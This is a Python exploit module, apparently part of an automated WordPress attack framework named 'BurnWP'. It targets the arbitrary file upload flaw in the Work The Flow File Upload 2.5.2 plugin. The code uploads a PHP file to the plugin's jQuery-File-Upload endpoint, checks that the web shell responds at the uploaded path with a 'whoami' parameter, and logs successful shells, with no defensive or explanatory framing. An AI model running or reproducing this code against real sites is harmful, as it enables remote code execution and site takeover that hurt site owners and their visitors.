import importlib
from pathlib import Path
import re, json
NO_USED = None

#print(NO_USED) None
#WordPress Plugin Work The Flow File Upload 2.5.2 - Arbitrary File Upload
#CVE : None 
#Author : Claudio Viviani
#Type : webapps
#Platform : PHP
#Exploit Date : 2015-04-05

RE_Helper = importlib.import_module('Core.Core_Helper')

class Exploit_jQuery: 
    def __init__(self, Target, Proxies=NO_USED, Sess=NO_USED, WPNonce=NO_USED, Config_UA=NO_USED):
        self.Target = Target
        self.Proxies_ON = Proxies
        self.Timeout = 30 if self.Proxies_ON else 10
        self.ROOT_X = Path(__file__).resolve().parents[1]
        self.json_data = NO_USED
        self.Sess = Sess
        self.WPNonce = WPNonce
        self.Config_UA = Config_UA
        
    def Exploiter(self):
        try:
            JqueryFU_Exploit = RE_Helper.Threaded_POST(
                                    CFG_DOMAIN=self.Target,
                                    CFG_VULN='wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php', 
                                    CFG_TIMEOUT=self.Timeout, 
                                    CFG_USERAGENT=self.Config_UA, 
                                    CFG_DATA={
                                        'action': 'upload'}, 
                                    CFG_FILE_UPLOAD={'files': f'{self.ROOT_X}/Files_BurnWP/error_log.php'},   
                                    CFG_RAW_BODY=NO_USED,
                                    CFG_DELAY_ATTACK=NO_USED,
                                    CFG_MODE="multipart",
                                    SET_REDIRECT=NO_USED,
                                    CFG_Proxies=NO_USED,
                                    Mem_Sess=NO_USED)
            REZ_JQUERY = JqueryFU_Exploit.run()
            REZ_EXPLOIT = [REZ_JQUERY[i] for i in REZ_JQUERY][0]
            if REZ_EXPLOIT['resp']:
                
                try:
                    self.json_data = REZ_EXPLOIT['resp'].json()
                except:
                    match = re.search(r'({.*})', REZ_EXPLOIT['resp'].text, re.DOTALL)
                    if match:
                        try:
                            self.json_data = json.loads(match.group(1))
                        except:
                            self.json_data = NO_USED

                if self.json_data:
                    RZ_SH3LL = RE_Helper.Func_ValidShell(self.Timeout, self.Proxies_ON, f'{self.Target}/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/error_log.php?whoami=@1337', self.Config_UA)
                    if RZ_SH3LL:
                        RE_Helper.Printed_Value.Log_Success(self.Target, '[PLUGIN] WorktheFlow_FileUpload | Weclome SHELL')
                         
                    else:
                        RE_Helper.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] WorktheFlow_FileUpload | Failed SHELL") 

                else:
                    RE_Helper.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] WorktheFlow_FileUpload | Failed") 

            else: 
                RE_Helper.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] WorktheFlow_FileUpload | Failed") 
        except:pass
            #RE_Helper.Printed_Value.Log_Error('Error Exploiter JQuery', f"{er}") 

def Plugin_BurnWP(Target, Proxies, Sess, WPNonce, UserAgent, PLUGIN_CONTROL_SYSTEM, FOUND_CMS):
    try:
        
        if PLUGIN_CONTROL_SYSTEM['C_WordPress'] and FOUND_CMS == 'WORDPRESS':
            Runner_Exploit = Exploit_jQuery(Target, Proxies, Sess, WPNonce, UserAgent)
            Runner_Exploit.Exploiter()

        return
    except:pass
        #RE_Helper.Printed_Value.Log_Error('Error JQuery', f"{er}")  
    #print(f"[PLUGIN #1 DRC] => {Target}, {Proxies}, {Sess}, {WPNonce}")
